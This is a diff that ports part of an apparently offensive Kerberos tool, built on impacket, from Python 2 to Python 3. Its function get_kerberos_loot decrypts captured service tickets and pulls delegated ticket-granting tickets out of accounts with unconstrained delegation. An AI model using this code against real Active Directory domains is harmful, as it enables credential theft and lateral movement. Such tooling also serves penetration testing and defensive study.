@@ -1,3 +1,4 @@
+from __future__ import unicode_literals
 import struct
 import datetime
 from binascii import unhexlify, hexlify
@@ -13,8 +14,8 @@ from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, 
     Ticket as TicketAsn1, EncTGSRepPart, EncTicketPart, AD_IF_RELEVANT, Ticket as TicketAsn1, KRB_CRED, EncKrbCredPart
 
 from impacket.krb5.crypto import Key, _enctype_table, Enctype, InvalidChecksum, string_to_key
-from krbcredccache import KrbCredCCache
-from spnego import GSSAPIHeader_SPNEGO_Init, GSSAPIHeader_KRB5_AP_REQ
+from .krbcredccache import KrbCredCCache
+from .spnego import GSSAPIHeader_SPNEGO_Init, GSSAPIHeader_KRB5_AP_REQ
 from impacket import LOG
 from impacket.krb5.types import Principal, KerberosTime, Ticket
 from impacket.krb5 import constants
@@ -110,7 +111,7 @@ def get_kerberos_loot(token, options):
 
     # Recover plaintext info from ticket
     try:
-        plainText = newCipher.decrypt(key, 2, str(cipherText))
+        plainText = newCipher.decrypt(key, 2, cipherText)
     except InvalidChecksum:
         LOG.error('Ciphertext integrity failed. Most likely the account password or AES key is incorrect')
         if options.salt:
@@ -118,7 +119,7 @@ def get_kerberos_loot(token, options):
         return
     LOG.debug('Ticket decrypt OK')
     encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]
-    sessionKey = Key(encTicketPart['key']['keytype'], str(encTicketPart['key']['keyvalue']))
+    sessionKey = Key(encTicketPart['key']['keytype'], bytes(encTicketPart['key']['keyvalue']))
 
     # Key Usage 11
     # AP-REQ Authenticator (includes application authenticator
@@ -135,7 +136,7 @@ def get_kerberos_loot(token, options):
     cipherText = decodedTGS['authenticator']['cipher']
     newCipher = _enctype_table[int(decodedTGS['authenticator']['etype'])]
     # Recover plaintext info from authenticator
-    plainText = newCipher.decrypt(sessionKey, 11, str(cipherText))
+    plainText = newCipher.decrypt(sessionKey, 11, cipherText)
 
     authenticator = decoder.decode(plainText, asn1Spec=Authenticator())[0]
     # print authenticator
@@ -154,21 +155,21 @@ def get_kerberos_loot(token, options):
     # 26-27 length of deleg field
     # 28..(n-1) KRB_CRED message if deleg is used (n = length of deleg + 28)
     # n..last  extensions
-    flags = struct.unpack('<L', str(cksum['checksum'])[20:24])[0]
+    flags = struct.unpack('<L', bytes(cksum['checksum'])[20:24])[0]
     # print flags
     if not flags & GSS_C_DELEG_FLAG:
         LOG.error('Delegate info not set, cannot extract ticket!')
         LOG.error('Make sure the account you use has unconstrained delegation rights')
         return
 
-    dlen = struct.unpack('<H', str(cksum['checksum'])[26:28])[0]
-    deldata = str(cksum['checksum'])[28:28+dlen]
+    dlen = struct.unpack('<H', bytes(cksum['checksum'])[26:28])[0]
+    deldata = bytes(cksum['checksum'])[28:28+dlen]
     creds = decoder.decode(deldata, asn1Spec=KRB_CRED())[0]
     # print creds
-    subkey = Key(authenticator['subkey']['keytype'], str(authenticator['subkey']['keyvalue']))
+    subkey = Key(authenticator['subkey']['keytype'], bytes(authenticator['subkey']['keyvalue']))
     newCipher = _enctype_table[int(creds['enc-part']['etype'])]
 
-    plainText = newCipher.decrypt(sessionKey, 14, str(creds['enc-part']['cipher']))
+    plainText = newCipher.decrypt(sessionKey, 14, bytes(creds['enc-part']['cipher']))
     # print plainText
     # Now we got the EncKrbCredPart
     enc_part = decoder.decode(plainText, asn1Spec=EncKrbCredPart())[0]
